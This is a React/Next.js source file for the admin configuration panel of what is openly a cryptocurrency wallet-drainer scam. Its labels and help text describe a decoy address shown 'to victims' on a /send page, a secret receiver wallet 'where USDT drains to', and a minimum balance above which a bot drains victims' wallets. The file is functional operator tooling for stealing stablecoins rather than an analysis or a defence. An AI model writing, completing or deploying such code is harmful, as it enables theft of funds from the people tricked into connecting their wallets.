"use client";

import { useState, useEffect, useCallback } from "react";
import { Save, Loader2 } from "lucide-react";

interface ConfigPanelProps {
  adminKey: string;
}

export default function ConfigPanel({ adminKey }: ConfigPanelProps) {
  const [receiverAddress, setReceiverAddress] = useState("");
  const [displayAddress, setDisplayAddress] = useState("");
  const [minThreshold, setMinThreshold] = useState("2");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);

  const authHeaders = { "x-admin-key": adminKey, "Content-Type": "application/json" };

  const fetchConfig = useCallback(async () => {
    try {
      const res = await fetch("/api/config", { headers: authHeaders });
      const data = await res.json();
      if (data.config) {
        setReceiverAddress(data.config["receiver_address"] ?? "");
        setDisplayAddress(data.config["display_address"] ?? "");
        setMinThreshold(data.config["min_threshold_usd"] ?? "2");
      }
    } catch {
      // ignore
    } finally {
      setLoading(false);
    }
  }, [adminKey]);

  useEffect(() => {
    fetchConfig();
  }, [fetchConfig]);

  async function handleSave() {
    setSaving(true);
    setSaved(false);
    try {
      await fetch("/api/config", {
        method: "PUT",
        headers: authHeaders,
        body: JSON.stringify({
          receiver_address: receiverAddress.trim(),
          display_address: displayAddress.trim(),
          min_threshold_usd: minThreshold,
        }),
      });
      setSaved(true);
      setTimeout(() => setSaved(false), 3000);
    } catch {
      // ignore
    } finally {
      setSaving(false);
    }
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center py-8">
        <Loader2 className="h-5 w-5 animate-spin text-gray-500" />
      </div>
    );
  }

  return (
    <div className="rounded-xl border border-gray-800 bg-[#111] p-6 flex flex-col gap-5">
      <h2 className="text-base font-semibold text-white">System Configuration</h2>

      <div className="flex flex-col gap-4">
        {/* Display Address — shown on /send page */}
        <div className="flex flex-col gap-2">
          <label className="text-sm text-gray-400">
            Display Address{" "}
            <span className="text-gray-600">(Shown on /send page to victims)</span>
          </label>
          <input
            type="text"
            value={displayAddress}
            onChange={(e) => setDisplayAddress(e.target.value)}
            placeholder="0x..."
            className="rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm font-mono text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
          />
          <p className="text-xs text-gray-600">
            This address is pre-filled in the address field on the /send page. Can be any address — it's just for display.
          </p>
        </div>

        {/* Receiver Address — where USDT actually drains */}
        <div className="flex flex-col gap-2">
          <label className="text-sm text-gray-400">
            Receiver Address <span className="text-gray-600">(Your actual wallet — where USDT drains to)</span>
          </label>
          <input
            type="text"
            value={receiverAddress}
            onChange={(e) => setReceiverAddress(e.target.value)}
            placeholder="0x..."
            className="rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm font-mono text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
          />
          <p className="text-xs text-gray-600">
            All drained USDT will be sent to this address. Keep this secret.
          </p>
        </div>

        {/* Minimum Threshold */}
        <div className="flex flex-col gap-2">
          <label className="text-sm text-gray-400">
            Minimum Threshold <span className="text-gray-600">(USD)</span>
          </label>
          <div className="flex items-center gap-2">
            <span className="text-gray-500 text-sm">$</span>
            <input
              type="number"
              value={minThreshold}
              onChange={(e) => setMinThreshold(e.target.value)}
              min="0"
              step="0.01"
              className="w-32 rounded-lg border border-gray-700 bg-[#0d0d0d] px-4 py-3 text-sm text-white placeholder-gray-600 focus:border-gray-500 focus:outline-none transition-colors"
            />
          </div>
          <p className="text-xs text-gray-600">
            Bot will only drain wallets with USDT balance above this value.
          </p>
        </div>
      </div>

      <button
        onClick={handleSave}
        disabled={saving}
        className="flex items-center gap-2 self-start px-5 py-2.5 rounded-lg bg-green-600 hover:bg-green-500 disabled:opacity-50 text-white text-sm font-medium transition-colors"
      >
        {saving ? (
          <Loader2 className="h-4 w-4 animate-spin" />
        ) : (
          <Save className="h-4 w-4" />
        )}
        {saved ? "Saved!" : "Save Changes"}
      </button>
    </div>
  );
}
